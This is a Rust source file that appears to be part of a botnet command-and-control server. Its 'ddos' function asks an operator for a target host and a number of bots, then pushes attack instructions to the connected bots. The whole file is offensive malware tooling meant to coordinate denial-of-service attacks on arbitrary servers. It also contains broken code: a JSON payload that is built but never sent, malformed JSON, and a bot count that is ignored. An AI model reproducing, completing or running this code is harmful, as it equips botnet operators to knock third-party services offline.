use std::{ error::Error, sync::Arc, thread::sleep, time::Duration};

use tokio::{io::AsyncWriteExt, sync::RwLock};

use crate::{utils::terminal::{clear, default_prompt, prompt, reply, reply_with_delay}, Connection, ConnectionList, TcpStream};




pub async fn ddos(mut socket : &mut TcpStream, bots_listening: ConnectionList ) -> Result<(), Box<dyn Error>> {

    loop {
        let bots_connectds_listening = bots_listening.read().await ;

        let sockets_bots: Vec<Arc<RwLock<TcpStream>>> = bots_connectds_listening
            .iter()
            .map(|conn| Arc::clone(&conn.stream))
            .collect();

        drop(bots_connectds_listening);

        clear(&mut socket).await;

        reply("Send a Ddos from web server http", true, &mut socket).await;
        let target = match prompt("target (ex :google.com) : ", &mut socket).await {
            Ok(target) => target,
            Err(_) => {
                // reply_with_delay("invalid target!", 2, &mut socket).await;
                continue
            }
        };

        let quantity_bots_listening =  sockets_bots.len() as u32 ;

        let quantity_bots: String = prompt(format!("quantity bots (max: {quantity_bots_listening}): ").as_str(), &mut socket).await?;

        let parsed_quantity_bots: u32 = match quantity_bots.trim().parse() {
            Ok(n) => n,
            Err(_) => {
                reply_with_delay("invalid number !", 2, &mut socket).await;
                continue
            }
        };

        if parsed_quantity_bots > quantity_bots_listening {
            reply_with_delay("quantity of bot unavaiable", 2, &mut socket).await;
            continue

        }

        reply("sending attacker to bots ...", true, &mut socket).await;

        // let handle = tookio::spawn( async move {

        // })

        for conn in sockets_bots.iter() {
            let mut current_socket_bot = conn.write().await;

            let json_payload = format!(r#"
            {{
                    "type_instruction":"ddos",
                    "target": {},
                    "timer" : "5",

            }}
            "#, target );

            match current_socket_bot.write_all(target.as_bytes()).await {
                Ok(_) => {},
                Err(_) => println!("deu um erro")
            };
            drop(current_socket_bot);
        }
        prompt("please enter to continue ...",&mut socket).await;
        break;
    }
    Ok(())

}